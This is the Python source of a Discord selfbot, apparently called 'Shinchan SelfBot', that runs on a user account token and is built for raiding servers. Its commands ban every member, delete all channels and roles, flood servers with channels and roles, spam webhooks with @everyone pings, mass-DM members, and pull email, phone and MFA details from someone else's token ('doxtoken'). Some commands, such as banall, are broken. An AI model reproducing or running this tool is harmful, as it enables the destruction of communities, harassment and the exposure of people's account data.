import discord
from discord.ext import commands
import asyncio, random, os, requests, sys, threading, datetime, json, aiohttp
from urllib import parse
import re, time
from colorama import Fore
import os

print('Logging In............')

prefix = input('Shinchan Runs Cord | PREFIX : ')
token = input('Shinchan Runs Cord | TOKEN: ')
password = input('Shinchan Runs Cord | PASSWORD: ')
client = commands.Bot(command_prefix=prefix, case_insensitive=True, self_bot=True)
client.remove_command(name='help')
os.system('cls' if os.name == 'nt' else 'clear')
os.system('cls' if os.name == 'nt' else 'clear')

@client.event
async def on_ready():
    await client.change_presence(activity=discord.Streaming(name='Shinchan Runs Cord', url='http://www.twitch.tv/shinchanforever'))
    print('''
╔═══╗╔╗            ╔╗           
║╔═╗║║║            ║║           
║╚══╗║╚═╗╔╗╔═╗ ╔══╗║╚═╗╔══╗ ╔═╗ 
╚══╗║║╔╗║╠╣║╔╗╗║╔═╝║╔╗║╚ ╗║ ║╔╗╗
║╚═╝║║║║║║║║║║║║╚═╗║║║║║╚╝╚╗║║║║
╚═══╝╚╝╚╝╚╝╚╝╚╝╚══╝╚╝╚╝╚═══╝╚╝╚╝                                                     
''')




@client.command(pass_context=True)
async def help(ctx):
    embed = discord.Embed(color=0)
    embed.set_author(name='Shinchan SelfBot')
    embed.set_footer(text='Made By Shinchan | github.com/apidev234')
    embed.add_field(name='help', value='```Shows Help Cmd```')
    embed.add_field(name='general', value='```Shows General Cmds```')
    embed.add_field(name='nuke', value='```Shows Nuke Cmds```')
    await ctx.send(embed=embed)

@client.command(pass_context=True)
async def nuke(ctx):
    embed = discord.Embed(color=0)
    embed.set_author(name='Shinchan SelfBot')
    embed.set_footer(text='Made By Shinchan | github.com/apidev234')
    embed.add_field(name="masschannels", value="Spam Over 250 Channels in The Guild", inline=True)
    embed.add_field(name="webhookspam", value="Spam 50 Webhooks With Everyone Mentions", inline=True)
    embed.add_field(name="trash", value="Destroys The Server", inline=True)
    embed.add_field(name="banall", value="Ban Everyone in The Server With a Speed of 50ban/sec", inline=True)
    embed.add_field(name="servername", value="Change The Servername", inline=True)
    embed.add_field(name="spamchangegcname", value="Spam Change Group Name", inline=True)
    embed.add_field(name="stopwebhookspam", value="Stops The Ongoing Webhook Attack", inline=True)
    embed.add_field(name="renamechannels", value="Rename All The Channels In Guild", inline=True)
    embed.add_field(name="renameroles", value="Rename The Roles In Guild", inline=True)
    embed.add_field(name="delwebhook", value="Delete a Webhook With Its link", inline=True)
    embed.add_field(name="tokeninfo", value="Get Info About A Token", inline=True)
    embed.add_field(name="geolocate", value="Locate Someone's IP Adress", inline=True)
    embed.add_field(name="dmall", value="Dm Everyone In The Server", inline=True)
    await ctx.send(embed=embed)

@client.command(pass_context=True)
async def general(ctx):
    embed = discord.Embed(color=0)
    embed.set_author(name='Shinchan SelfBot')
    embed.set_footer(text='Made By Shinchan | github.com/apidev234')
    embed.add_field(name="purge", value="Purge a Amount Of Messages In The Channel", inline=True)
    embed.add_field(name="stream", value="Set a Streaming Status", inline=True)
    embed.add_field(name="watching", value="Set a Watching Presence", inline=True)
    embed.add_field(name="playing", value="Set a Playing Presence", inline=True)
    embed.add_field(name="listening", value="Set a Listening Presence", inline=True)
    embed.add_field(name="embed", value="Send an Embed With Text And Color", inline=True)
    embed.add_field(name="status", value="Get Status Of Nitro Gen or Nitro Sniper or DND Status", inline=True)
    embed.add_field(name="spam", value="Spam a Message in a Channel", inline=True)
    embed.add_field(name="av", value="Get Yours/Someone's Avatar", inline=True)
    embed.add_field(name="ping", value="Get Self Bot's Latency", inline=True)
    embed.add_field(name="pingweb", value="Makes The Bot Remain 24/7", inline=True)
    embed.add_field(name="whois", value="Get Info about a User", inline=True)
    embed.add_field(name="getroles", value="Get Roles Of a Server", inline=True)
    embed.add_field(name="hastebin", value="Upload Your Text On hastebin.com", inline=True)
    embed.add_field(name="first_message", value="Gets The First Message in The Channel", inline=True)
    await ctx.send(embed=embed)

@client.command()
async def dmall(ctx, *, message): 
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await asyncio.sleep(5)    
            await user.send(message)
        except:
            pass

@client.command(aliases=["masschannels", "masschannel", "ctc"])
async def spamchannels(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name="shinchan runs cord")
        except:
            return

@client.command(aliases=["streaming"])
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url="https://twitch.tv/shinchanforever",
    )
    await client.change_presence(activity=stream)


@client.command(alises=["game"])
async def playing(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await client.change_presence(activity=game)

@client.command()
async def embed(ctx, col, arg1, arg2, arg3):
    try:
        if col == "red":
            embedcolor = Color.red()
        if col == "orange":
            embedcolor = Color.orange()
        if col == "yellow":
            embedcolor = Color.yellow()
        if col == "green":
            embedcolor = Color.green()
        if col == "blue":
            embedcolor = Color.blue()
        if col == "purple":
            embedcolor = Color.purple()
        if col == "black":
            embedcolor = Color.black()
        if col == "none":
            embedcolor = "none"
        if embedcolor == "none":
            embed=discord.Embed(title=arg1, description=arg2)
            embed.set_footer(text=arg3)
            await ctx.send(embed=embed)
            await ctx.message.delete()
        if embedcolor != "none":
            embed=discord.Embed(title=arg1, description=arg2, color=embedcolor)
            embed.set_footer(text=arg3)
            await ctx.send(embed=embed)
            await ctx.message.delete()
    except:
        print(Fore.RED+"[>] Failed to send embed")




@client.command(aliases=["listen"])
async def listening(ctx, *, message):
    await ctx.message.delete()
    await client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name=message,
        ))


@client.command()
async def status(ctx, arg):
    global donotdisturb
    global status
    global nitrosnipestatus
    thing = arg
    await ctx.message.delete()
    if thing == "dnd":
        statusmsg = await ctx.send(str(donotdisturb))
        time.sleep(2)
        await statusmsg.delete()
    if thing == "nitrogen":
        statusmsg = await ctx.send(status)
        time.sleep(2)
        await statusmsg.delete()
    if thing == "nitrosnipe":
        statusmsg = await ctx.send(str(nitrosnipestatus))
        time.sleep(2)
        await statusmsg.delete()

@client.command(aliases=["watch"])
async def watching(ctx, *, message):
    await ctx.message.delete()
    await client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=message
        ))


@client.command()
async def spam(ctx, amount: int, *, message):
    for _i in range(amount):
        await ctx.send(message)


@client.command(aliases=[
 'geolocate', 'iplookup', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str='1.3.3.7'):
    r = requests.get(f"http://extreme-ip-lookup.com/json/{ipaddr}")
    geo = r.json()
    em = discord.Embed()
    fields = [
     {'name':'IP',
      'value':geo['query']},
     {'name':'Type',
      'value':geo['ipType']},
     {'name':'Country',
      'value':geo['country']},
     {'name':'City',
      'value':geo['city']},
     {'name':'Continent',
      'value':geo['continent']},
     {'name':'Country',
      'value':geo['country']},
     {'name':'Hostname',
      'value':geo['ipName']},
     {'name':'ISP',
      'value':geo['isp']},
     {'name':'Latitute',
      'value':geo['lat']},
     {'name':'Longitude',
      'value':geo['lon']},
     {'name':'Org',
      'value':geo['org']},
     {'name':'Region',
      'value':geo['region']}]
    for field in fields:
        if field['value']:
            em.add_field(name=(field['name']), value=(field['value']), inline=True)

    return await ctx.send(embed=em)


languages = {'hu':'Hungarian, Hungary',
 'nl':'Dutch, Netherlands',
 'no':'Norwegian, Norway',
 'pl':'Polish, Poland',
 'pt-BR':'Portuguese, Brazilian, Brazil',
 'ro':'Romanian, Romania',
 'fi':'Finnish, Finland',
 'sv-SE':'Swedish, Sweden',
 'vi':'Vietnamese, Vietnam',
 'tr':'Turkish, Turkey',
 'cs':'Czech, Czechia, Czech Republic',
 'el':'Greek, Greece',
 'bg':'Bulgarian, Bulgaria',
 'ru':'Russian, Russia',
 'uk':'Ukranian, Ukraine',
 'th':'Thai, Thailand',
 'zh-CN':'Chinese, China',
 'ja':'Japanese',
 'zh-TW':'Chinese, Taiwan',
 'ko':'Korean, Korea'}
locales = [
 'da', 'de', 'en-GB', 'en-US', 'es-ES', 'fr', 'hr', 'it', 'lt', 'hu', 'nl',
 'no', 'pl', 'pt-BR', 'ro', 'fi', 'sv-SE', 'vi', 'tr', 'cs', 'el', 'bg',
 'ru', 'uk', 'th', 'zh-CN', 'ja', 'zh-TW', 'ko']

@client.command(aliases=['tdox', 'doxtoken'])
async def tokeninfo(ctx, _token):
    headers = {'Authorization':_token,
     'Content-Type':'application/json'}
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me',
          headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {'Authorization':'Bot ' + _token,
         'Content-Type':'application/json'}
        try:
            res = requests.get('https://canary.discordapp.com/api/v6/users/@me',
              headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(description=f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
            fields = [
             {'name':'Flags',
              'value':res['flags']},
             {'name':'Local language',
              'value':res['locale'] + (f"{language}")},
             {'name':'Verified',
              'value':res['verified']}]
            for field in fields:
                if field['value']:
                    em.add_field(name=(field['name']),
                      value=(field['value']),
                      inline=False)
                    em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")

            return await ctx.send(embed=em)
        except KeyError:
            await ctx.send('Invalid token')

    em = discord.Embed(description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
    nitro_type = 'None'
    if 'premium_type' in res:
        if res['premium_type'] == 2:
            nitro_type = 'Nitro Premium'
        elif res['premium_type'] == 1:
            nitro_type = 'Nitro Classic'
    fields = [
     {'name':'Phone',  'value':res['phone']},
     {'name':'Flags',
      'value':res['flags']},
     {'name':'Local language',
      'value':res['locale'] + (f"{language}")},
     {'name':'MFA',
      'value':res['mfa_enabled']},
     {'name':'Verified',
      'value':res['verified']},
     {'name':'Nitro',
      'value':nitro_type}]
    for field in fields:
        if field['value']:
            em.add_field(name=(field['name']),
              value=(field['value']),
              inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
            em.set_footer(text='Shinchan Runs Cord')

    return await ctx.send(embed=em)


def RandomColor():
    randcolor = discord.Color(random.randint(0, 16777215))
    return randcolor


@client.command(aliases=['trash', 'wizz'])
async def destroy(ctx):
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass

    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass

    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass

    try:
        await ctx.guild.edit(name='Shinchan Runs Cord',
          description='Wizzed By Shinchan',
          reason='Shinchan Trashed You',
          icon=None,
          banner=None)
    except:
        pass

    for _i in range(100):
        await ctx.guild.create_text_channel(name='Shinchan Runs Cord')

    for _i in range(100):
        await ctx.guild.create_role(name='Shinchan Was Here', color=(RandomColor()))


format = '%a, %d %b %Y | %H:%M:%S %ZGMT'



@client.command(aliases=['deletewebhook'])
async def delwebhook(ctx, link=None):
    if link == None:
        embed = discord.Embed(title='Shinchan Runs Cord', description='```>delwebhook <webhook>```')
        embed.set_footer(text='Shinchan Runs Cord')
        await ctx.message.edit(content='', embed=embed)
    else:
        embed = discord.Embed(title='Shinchan Runs Cord', description=f"Sending a delete request to\n{link}")
        embed.set_footer(text='Made By Shinchan')
        await ctx.message.edit(content='', embed=embed)
        result = requests.delete(link)
        if result.status_code == 204:
            embed = discord.Embed(title='Shinchan Runs Cord', description='WEBHOOK DELETED')
            embed.set_footer(text='Shinchan Runs Cord')
            await ctx.message.edit(embed=embed)
        else:
            embed = discord.Embed(title='Shinchan On ToP', description=f"Delete request responded with status code : {result.status_code}\\{result.text}")
            embed.set_footer(text='Shinchan Runs Cord')
            await ctx.message.edit(embed=embed)


@client.command()
async def purge(ctx, amount: int=None):
    if amount is None:
        async for message in ctx.message.channel.history(limit=999).filter(lambda m: m.author == client.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass

    else:
        async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == client.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass


@client.command()
async def av(ctx, *, avamember):
    user = client.get_user(avamember)
    await ctx.send(f"{user.avatar_url}")


@client.command()
async def pingweb(ctx, website=None):
    await ctx.send(f"Pinging {website} with 32 bytes of data:")
    if website is None:
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            try:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            finally:
                e = None
                del e

        if r == 404:
            await ctx.send(f"Website is down, status = ({r})")
        else:
            await ctx.send(f"Website is operational, status = ({r})")
            await ctx.send('Timed out')


@client.command()
async def ping(ctx, ipp=None):
    await ctx.send(f"Pinging {ipp} with 32 bytes of data:")
    await ctx.send('Timed out.')


@client.command(aliases=['whois'])
async def doxuser(ctx, member: discord.Member=None):
    if not member:
        member = ctx.message.author
    roles = [role for role in member.roles]
    embed = discord.Embed(colour=(discord.Colour.default()), timestamp=(ctx.message.created_at), title=f"User Info - {member}")
    embed.set_thumbnail(url=(member.avatar_url))
    embed.set_footer(text='Shinchan Runs Cord')
    embed.add_field(name='ID:', value=(member.id))
    embed.add_field(name='Display Name:', value=(member.display_name))
    embed.add_field(name='Created Account On:', value=(member.created_at.strftime('%a, %#d %B %Y, %I:%M %p UTC')))
    embed.add_field(name='Joined Server On:', value=(member.joined_at.strftime('%a, %#d %B %Y, %I:%M %p UTC')))
    embed.add_field(name='Roles:', value=(''.join([role.mention for role in roles])))
    embed.add_field(name='Highest Role:', value=(member.top_role.mention))
    print(member.top_role.mention)
    await ctx.send(embed=embed)


@client.command(aliases=['roles'])
async def getroles(ctx):
    roles = list(ctx.guild.roles)
    roles.reverse()
    roleStr = ''
    for role in roles:
        if role.name == '@everyone':
            roleStr += '@\u200beveryone'
        else:
            roleStr += role.name + '\n'

    print(roleStr)
    await ctx.send(roleStr)


@client.command(aliases=['renameserver', 'nameserver'])
async def servername(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)


@client.command()
async def hastebin(ctx, *, message):
    r = requests.post('https://hastebin.com/documents', data=message).json()
    await ctx.send(f"<https://hastebin.com/{r['key']}>")


@client.command(aliases=['spamchangegcname', 'changegcname'])
async def spamgcname(ctx):
    if isinstance(ctx.message.channel, discord.GroupChannel):
        watermark = 'Shinchan Runs Cord'
        name = ''
        for letter in watermark:
            name = name + letter
            await ctx.message.channel.edit(name=name)


@client.command
def banall(i):
    while True:
        r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{i}", headers=headers)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
            print(f"Got ratelimited, retrying after:  {r.json()['retry_after']} s.")
        else:
            break


@client.command(name='first-message',
  aliases=['firstmsg', 'fm', 'firstmessage'])
async def first_message(ctx, channel: discord.TextChannel=None):
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
    embed = discord.Embed(description=(first_message.content))
    embed.add_field(name='First Message',
      value=f"[Click here to Jump]({first_message.jump_url})")
    embed.set_footer(text='Shinchan Runs Cord')
    await ctx.send(embed=embed)


def ssspam(webhook):
    while spammingdawebhookeroos:
        randcolor = random.randint(0, 16777215)
        data = {'content':'@everyone Shinchan Runs You',
         'embeds':[
          {'title':'Shinchan Runs You',
           'tts':'true',
           'description':'.',
           'url':'https://twitch.tv/shinchanforever',
           'color':randcolor,
           'fields':[
            {'name':'Shinchan Runs Cord',
             'value':'.'},
            {'name':'Shinchan Runs Cord',
             'value':'.'},
            {'name':'Shinchan Runs Cord',
             'value':'.'},
            {'name':'.',
             'value':'.'}],
           'author':{'name':'Wizzed By Shinchan',
            'url':'https://i.imgur.com/ikDwWCD.jpeg',
            'icon_url':'https://cdn.exobot.site/real/95B4.jpg?width=337&height=449'},
           'footer':{'text':'Wizzed By Shinchan',
            'icon_url':'https://cdn.exobot.site/real/95B4.jpg?width=337&height=449'},
           'image':{'url': 'https://i.imgur.com/ikDwWCD.jpeg'},
           'thumbnail':{'url': 'https://cdn.exobot.site/real/95B4.jpg?width=337&height=449'}},
          {'url':'https://i.imgur.com/ikDwWCD.jpeg',
           'image':{'url': 'https://cdn.exobot.site/real/95B4.jpg?width=337&height=449'}},
          {'url':'https://cdn.exobot.site/real/95B4.jpg?width=337&height=449',
           'image':{'url': 'https://cdn.exobot.site/real/95B4.jpg?width=337&height=449'}},
          {'url':'https://github.com/apidev234',
           'image':{'url': 'https://cdn.exobot.site/real/95B4.jpg?width=337&height=449'}}],
         'username':'Shinchan Runs You',
         'avatar_url':'https://cdn.exobot.site/real/95B4.jpg?width=337&height=449'}
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                time.sleep(delay)

        else:
            delay = random.randint(30, 60)
            time.sleep(delay)


@client.command(aliases=['webhookfuck', 'spamwebhooks', 'webhooknuke', 'webhooksnuke', 'webhooksfuck', 'spamwebhook'])
async def webhookspam(ctx):
    global spammingdawebhookeroos
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target=ssspam, args=(webhook.url,)).start()

    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1
    else:
        webhookamount = 50 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 1
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='Shinchan Runs Cord')
                threading.Thread(target=ssspam, args=(webhook.url,)).start()
                f = open('data/webhooks-' + str(ctx.guild.id) + '.txt', 'a')
                f.write(f"{webhook.url} \n")
                f.close()
            except:
                print(f"{Fore.RED} > Webhook Error")


@client.command(aliases=['stopwebhookfuck', 'webhookstop', 'webhookspamstop', 'stopwebhooksspam', 'webhookspamoff'])
async def stopwebhookspam(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass

    spammingdawebhookeroos = False


@client.command(aliases=['rc'])
async def renamechannels(ctx, *, name):
    for channel in ctx.guild.channels:
        await channel.edit(name=name)


@client.command(aliases=['rr'])
async def renameroles(ctx, *, name):
    for role in ctx.guild.roles:
        await role.edit(name=name)


client.run(token, bot=False)
